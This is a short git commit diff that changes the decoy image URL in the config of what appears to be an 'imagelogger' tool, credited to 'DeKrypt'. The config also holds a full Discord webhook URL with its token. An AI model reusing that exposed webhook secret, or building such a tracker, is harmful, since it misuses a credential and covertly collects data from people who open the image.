1ec398fed6bb64650460b12087a0846f4c76a330
khamood531-code <khamood531@gmail.com>
2026-08-16 07:52:55 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1538395973792043109/5kwVyiDP_LHmqdiDu9dvoIpFc17MUlHZ5ZrLSH1vcVE3h9-wvSinjQ_QFk_2ECSlx-WV",
-    "image": "https://static.vecteezy.com/system/resources/previews/045/648/580/non_2x/cute-hamster-meme-transparent-background-illustration-free-png.png", # You can also have a custom image by using a URL argument
+    "image": "https://freepngimg.com/download/meme/98800-meme-dank-download-hq.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
